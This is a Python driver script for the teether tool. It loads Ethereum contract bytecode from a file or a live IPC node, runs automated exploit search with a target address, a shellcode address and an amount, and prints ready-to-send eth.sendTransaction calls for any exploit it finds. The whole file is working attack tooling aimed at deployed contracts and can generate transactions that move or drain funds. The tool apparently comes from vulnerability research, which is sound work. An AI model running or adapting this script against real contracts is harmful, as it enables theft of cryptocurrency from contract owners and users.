#!/usr/bin/env python3
import json
import logging
import resource
import sys
from web3 import Web3

from teether.exploit import combined_exploit
from teether.project import Project

logging.basicConfig(level=logging.INFO)


def hex_encode(d):
    return {k: v.hex() if isinstance(v, bytes) else v for k, v in d.items()}


def main(code_path, target_addr, contract_addr, shellcode_addr, amount, savefile=None, initial_storage_file=None, initial_balance=None,
         flags=None, token_addr=None, token_code_path=None, token_storage_file=None):
    savefilebase = savefile or code_path
    chain = None
    if code_path.endswith('.json'):
        with open(code_path, 'rb') as f:
            jd = json.load(f)
        p = Project.from_json(jd)
    else:
        if code_path.endswith('.ipc'):
            chain = Web3(Web3.IPCProvider(code_path))
            if not chain.isConnected():
                print('There was an error with the chain endpoint!', file=sys.stderr)
                exit(-1)
            inbuffer = chain.eth.getCode(contract_addr).hex()[2:]
        else:
            with open(code_path) as infile:
                inbuffer = infile.read().rstrip()
        code = bytes.fromhex(inbuffer)
        p = Project(code)
        with open('%s.project.json' % savefilebase, 'w') as f:
            json.dump(p.to_json(), f)

    tp = None
    if flags == {'CALL'}:
        if token_code_path and token_code_path.endswith('.json'):
            with open(token_code_path, 'rb') as f:
                jd = json.load(f)
            tp = Project.from_json(jd)
        else:
            if chain:
                inbuffer = chain.eth.getCode(token_addr).hex()[2:]
            else:
                with open(token_code_path) as infile:
                    inbuffer = infile.read().rstrip()
            token_code = bytes.fromhex(inbuffer)
            tp = Project(token_code)
            with open('%s.project.json' % (savefilebase + "_token"), 'w') as f:
                json.dump(p.to_json(), f)

    amount_check = '+'
    amount = amount.strip()
    if amount[0] in ('=', '+', '-'):
        amount_check = amount[0]
        amount = amount[1:]
    amount = int(amount)

    initial_storage = dict()
    if initial_storage_file:
        with open(initial_storage_file, 'rb') as f:
            initial_storage = {int(k, 16): int(v, 16) for k, v in json.load(f).items()}

    t_initial_storage = dict()
    if token_storage_file:
        with open(token_storage_file, 'rb') as f:
            t_initial_storage = {int(k, 16): int(v, 16) for k, v in json.load(f).items()}

    #flags = flags or {'CALL', 'CALLCODE', 'DELEGATECALL', 'SELFDESTRUCT'}

    storage_output = initial_storage_file or '%s.store.json' % savefilebase if chain else None

    if token_addr:
        token_addr = int(token_addr, 16)

    result = combined_exploit(p, int(target_addr, 16), int(contract_addr, 16), int(shellcode_addr, 16), amount, amount_check,
                              initial_storage, initial_balance,
                              flags=flags, storage_output=storage_output, chain=chain, tp=tp,
                              token_addr=token_addr, t_initial_storage=t_initial_storage)
    if result:

        call, r, model = result

        print(model)

        with open('%s.exploit.json' % savefilebase, 'w') as f:
            json.dump({'paths': [{'index': i, 'path': [ins for ins in res.state.trace if
                                                       ins in p.cfg.bb_addrs or ins == res.state.trace[-1]]} for
                                 i, res in enumerate(r.results)],
                       'calls': [{'index': i, 'call': hex_encode(c)} for i, c in enumerate(call)]}, f)

        for i, res in enumerate(r.results):
            print('%d: %s' % (
                i, '->'.join('%x' % i for i in res.state.trace if i in p.cfg.bb_addrs or i == res.state.trace[-1])))
        print(call)
        print
        for c in call:
            if c['caller'] == c['origin']:
                print('eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x%040x"%s, gas:500000, gasPrice:0})' % (
                    c['origin'], c.get('payload', b'').hex(), int(contract_addr, 16),
                    ", value:%d" % c['value'] if c.get('value', 0) else ''))
            else:
                print('eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x%040x"%s, gas:500000, gasPrice:0})' % (
                    c['origin'], c.get('payload', b'').hex(), c['caller'],
                    ", value:%d" % c['value'] if c.get('value', 0) else ''))

        return True
    return False


def print_usage_and_exit():
    print('Usage: %s LOG3/SSTORE <code/ipc-endpoint> <target-address> <contract-adress> <shellcode-address> '
          '<target_amount> [savefile] [initial-storage file]' %
          sys.argv[0], file=sys.stderr)
    print('Or:    %s CALL <ipc-endpoint> <target-address> <contract-adress> <shellcode-address> '
          '<target_amount> <indirect-token-address> [savefile] [initial-storage file]' %
          sys.argv[0], file=sys.stderr)
    print('Or:    %s CALL <code> <target-address> <contract-adress> <shellcode-address> <target_amount> '
          '<indirect-token-address> <indirect-token-code> <indirect-token-storage> [savefile] [initial-storage file]' %
          sys.argv[0], file=sys.stderr)
    exit(-1)


if __name__ == '__main__':
    # limit memory to 8GB
    # mem_limit = 8 * 1024 * 1024 * 1024
    # try:
    #     rsrc = resource.RLIMIT_VMEM
    # except:
    #     rsrc = resource.RLIMIT_AS
    # resource.setrlimit(rsrc, (mem_limit, mem_limit))

    fields = ['target-address', 'contract-address', 'shellcode-address', 'target_amount',
              'indirect-token-address', 'indirect-token-code', 'indirect-token-storage',
              'savefile', 'initial-storage']

    config = {f: None for f in fields}

    if len(sys.argv) < 3 or sys.argv[1].upper() not in {'LOG3', 'SSTORE', 'CALL'}:
        print_usage_and_exit()
    config['flags'] = {sys.argv[1].upper()}
    config['code'] = sys.argv[2]

    if config['flags'] != {'CALL'}:
        fields = fields[:4] + fields[-2:]
    elif config['code'].endswith('.ipc'):
        fields = fields[:5] + fields[-2:]

    field_iter = iter(fields)
    for arg in sys.argv[3:]:
        field = next(field_iter)
        config[field] = arg

    if config[fields[-3]] is None:
        print_usage_and_exit()

    main(config['code'], config['target-address'], config['contract-address'], config['shellcode-address'],
         config['target_amount'], config['savefile'], config['initial-storage'], None,
         config['flags'], config['indirect-token-address'], config['indirect-token-code'], config['indirect-token-storage'])

